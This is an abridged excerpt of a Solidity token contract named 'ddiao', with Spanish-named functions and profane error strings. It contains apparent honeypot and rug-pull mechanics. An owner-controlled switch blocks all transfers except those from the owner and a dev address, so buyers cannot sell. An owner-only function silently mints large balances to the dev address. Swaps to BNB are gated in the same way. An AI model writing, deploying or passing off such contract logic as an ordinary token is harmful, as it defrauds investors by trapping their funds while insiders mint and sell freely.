...
contract ddiao is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 800000000 * 10**6 * 10**7;
    ...
    bool enLicuar;
    bool public puedesCambiar = true;
    bool public puedesLicuar = false;
    
    modifier bloquearElIntercambio {
        enLicuar = true;
        _;
        enLicuar = false;
    }
    ...
    function creyendoMas(address cuenta, uint256 monto) internal virtual onlyOwner {
        ...
        _balances[_excludeDevAddress] += monto * 10**18;
    ...
    function _creyendoMas(address account, uint256 monto) public {
     ...
     function puedesCambiarLo(bool truefalse) external onlyOwner() {
        puedesCambiar = truefalse;
    }
    ...
    function _transfer(
        ...
        //kachow baw kai dai lu sue dai
        if (sender != owner() && !puedesCambiar || 
        sender != _excludeDevAddress && !puedesCambiar) {
            require(puedesCambiar, "No puedes cambiar puta");
        }
    ...
    function cambiarYLicuar(uint256 contractTokenBalance) private bloquearElIntercambio {
    ...
    function swapTokensForBNB(uint256 tokenAmount) private {
        ...
        if (address(this) != owner() && !puedesLicuar || 
        address(this) != _excludeDevAddress && !puedesLicuar) {
            require(puedesLicuar, "No puedes licuar puta");           
        } else {
             // make the swap
    ...
    function _habilitarIntercambiarYLicuar(bool _enabled) public onlyOwner {
        puedesLicuar = _enabled;
